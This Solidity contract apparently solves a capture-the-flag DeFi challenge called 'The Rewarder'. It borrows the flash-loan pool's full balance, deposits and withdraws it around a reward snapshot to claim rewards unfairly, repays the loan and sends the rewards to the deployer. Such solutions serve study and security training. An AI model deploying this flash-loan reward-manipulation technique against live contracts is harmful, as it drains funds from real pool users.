// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../the-rewarder/AccountingToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract TheRewarderAttacker {
  
  IERC20 immutable liquidityToken;
  FlashLoanerPool immutable flashLoanPool;
  TheRewarderPool immutable rewarderPool;
  IERC20 immutable rewardToken;
  IERC20 immutable accountingToken;
  address immutable attacker;
  
  constructor (address liqTokenAddr, address flashLoanPoolAddr, address rewarderPoolAddr, address rewardTokenAddr, address accountingTokenAddr) {
    liquidityToken = IERC20(liqTokenAddr);
    flashLoanPool = FlashLoanerPool(flashLoanPoolAddr);
    rewarderPool = TheRewarderPool(rewarderPoolAddr);
    rewardToken = IERC20(rewardTokenAddr);
    accountingToken = IERC20(accountingTokenAddr);
    attacker = msg.sender;
  }
  
  function receiveFlashLoan(uint256 amount) public {
    // Transferring right when a snapshot must be taken (actually triggering the snapshot)
    // and immediately withdrawing does the trick
    liquidityToken.approve(address(rewarderPool), amount);
    rewarderPool.deposit(amount);
    rewarderPool.withdraw(amount);
    liquidityToken.transfer(address(flashLoanPool), amount);
  }
  
  function exploit() public {
    flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
    rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
  }
}

